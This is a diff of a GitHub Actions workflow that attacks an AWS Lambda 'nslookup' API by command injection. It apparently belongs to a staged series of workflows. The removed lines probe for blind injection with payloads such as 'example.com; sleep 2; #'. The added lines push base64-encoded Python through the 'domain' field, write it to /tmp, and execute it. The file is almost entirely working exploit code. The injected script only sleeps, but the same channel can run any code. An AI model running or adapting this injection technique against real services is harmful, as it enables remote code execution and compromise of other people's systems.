@@ -1,4 +1,4 @@
-name: Stage2-Isolate-Command
+name: Stage2-Test-Base64
 
 on:
   push:
@@ -11,7 +11,7 @@ permissions:
   contents: read
 
 jobs:
-  isolate:
+  test:
     runs-on: ubuntu-latest
 
     steps:
@@ -21,7 +21,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Isolate Lambda command execution
+      - name: Test Base64 decoding inside Lambda
         shell: bash
         run: |
           set +e
@@ -29,6 +29,7 @@ jobs:
           python3 -m pip install boto3 requests requests-aws4auth --quiet
 
           python3 - <<'PY'
+          import base64
           import shlex
           import time
           import requests
@@ -36,6 +37,9 @@ jobs:
           from requests_aws4auth import AWS4Auth
 
           API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+
+          script = "import time; time.sleep(2)"
+          encoded = base64.b64encode(script.encode()).decode()
 
           credentials = boto3.Session().get_credentials().get_frozen_credentials()
 
@@ -47,47 +51,26 @@ jobs:
               session_token=credentials.token
           )
 
-          tests = [
-              (
-                  "shell_sleep",
-                  "example.com; sleep 2; #"
-              ),
-              (
-                  "python_sleep",
-                  "example.com; python3 -c "
-                  + shlex.quote("import time; time.sleep(2)")
-                  + "; #"
-              ),
-              (
-                  "python_path_sleep",
-                  "example.com; /var/lang/bin/python3 -c "
-                  + shlex.quote("import time; time.sleep(2)")
-                  + "; #"
-              )
-          ]
+          command = (
+              "example.com; "
+              "printf '%s' "
+              + shlex.quote(encoded)
+              + " | base64 -d > /tmp/test.py; "
+              + "python3 /tmp/test.py; #"
+          )
 
-          for name, command in tests:
-              started = time.monotonic()
+          started = time.monotonic()
 
-              try:
-                  response = requests.post(
-                      API,
-                      json={"domain": command},
-                      auth=auth,
-                      timeout=20
-                  )
+          response = requests.post(
+              API,
+              json={"domain": command},
+              auth=auth,
+              timeout=20
+          )
 
-                  elapsed = time.monotonic() - started
+          elapsed = time.monotonic() - started
 
-                  print("TEST=" + name)
-                  print("HTTP=" + str(response.status_code))
-                  print("ELAPSED=%.2f" % elapsed)
-                  print("---")
-
-              except Exception as error:
-                  elapsed = time.monotonic() - started
-                  print("TEST=" + name)
-                  print("ERROR=" + repr(error))
-                  print("ELAPSED=%.2f" % elapsed)
-                  print("---")
+          print("HTTP=" + str(response.status_code))
+          print("ELAPSED=%.2f" % elapsed)
+          print(response.text)
           PY
